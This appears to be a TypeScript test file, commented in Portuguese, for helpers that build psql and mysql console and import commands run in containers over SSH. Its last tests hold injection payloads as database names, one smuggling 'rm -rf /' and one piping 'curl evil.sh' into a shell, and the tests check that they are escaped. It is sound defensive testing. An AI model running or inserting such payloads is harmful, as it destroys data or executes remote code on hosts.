/**
 * Self-check das funções puras do terminal de container — sem framework:
 *   npx ts-node src/terminal/container-shell.util.spec.ts
 */
import assert from 'node:assert';
import { dbConsoleCommand, dbImportSecretKey, dbImportCommand } from './container-shell.util';

assert.equal(dbConsoleCommand('postgres:16-alpine'), 'psql -U postgres');
assert.equal(dbConsoleCommand('mysql:8'), 'mysql -u root -p');
assert.equal(dbConsoleCommand('mariadb:11'), 'mysql -u root -p');
assert.equal(dbConsoleCommand('mongo:7'), 'mongosh');
assert.equal(dbConsoleCommand('redis:7-alpine'), 'redis-cli');
// case-insensitive — tags de imagem variam maiúscula/minúscula na prática
assert.equal(dbConsoleCommand('POSTGRES:16'), 'psql -U postgres');
// não-banco: sem console
assert.equal(dbConsoleCommand('nginx:alpine'), null);
assert.equal(dbConsoleCommand('henrygd/beszel:0.14.0'), null);

// --- dbImportSecretKey -------------------------------------------------------
assert.equal(dbImportSecretKey('postgres:16-alpine'), 'POSTGRES_PASSWORD');
assert.equal(dbImportSecretKey('mysql:8'), 'ROOT_PASSWORD');
assert.equal(dbImportSecretKey('mariadb:11'), 'ROOT_PASSWORD');
assert.equal(dbImportSecretKey('mongo:7'), null, 'mongo fora do escopo de importação .sql');
assert.equal(dbImportSecretKey('redis:7-alpine'), null);
assert.equal(dbImportSecretKey('nginx:alpine'), null);

// --- dbImportCommand ----------------------------------------------------------
const pg = dbImportCommand('postgres:16-alpine', "senha'com'aspas", 'app');
assert.ok(pg);
assert.equal(pg!.command, "psql -U postgres -d 'app'");
assert.ok(pg!.execFlags.startsWith('-e PGPASSWORD='), 'postgres passa a senha por variável de ambiente do exec');
// aspa dentro da senha não pode escapar da aspa simples do shell
assert.ok(!/PGPASSWORD=senha'com/.test(pg!.execFlags), 'senha com aspa simples não pode quebrar o comando');

const mysql = dbImportCommand('mysql:8', 'segredo', 'app');
assert.ok(mysql);
assert.equal(mysql!.execFlags, '', 'mysql não precisa de flag extra no exec — senha vai no próprio comando');
assert.equal(mysql!.command, "mysql -uroot -p'segredo' 'app'");

assert.equal(dbImportCommand('mongo:7', 'x', 'app'), null);
assert.equal(dbImportCommand('nginx:alpine', 'x', 'app'), null);

// dbName vem de DATABASE_NAME, uma variável de deploy digitada pelo usuário —
// tem que ir pro comando remoto tão protegida quanto a senha, senão um nome de
// banco malicioso quebra pra fora do psql/mysql e executa comando arbitrário no
// host (a implantação inteira roda via `ssh.exec`, que passa a string pro shell
// remoto interpretar).
const injectedPg = dbImportCommand('postgres:16', 'pw', "app'; rm -rf / #");
assert.ok(injectedPg);
// a aspa simples do valor malicioso tem que virar '\'' (fecha, aspa escapada, reabre) —
// se aparecesse como -d app'; rm -rf / #' sem escape, o "; rm -rf /" rodaria fora da aspa
assert.equal(injectedPg!.command, "psql -U postgres -d 'app'\\''; rm -rf / #'");

const injectedMysql = dbImportCommand('mysql:8', 'pw', 'app; curl evil.sh | sh #');
assert.ok(injectedMysql);
assert.equal(injectedMysql!.command, "mysql -uroot -p'pw' 'app; curl evil.sh | sh #'");

console.log('container-shell.util self-check OK');
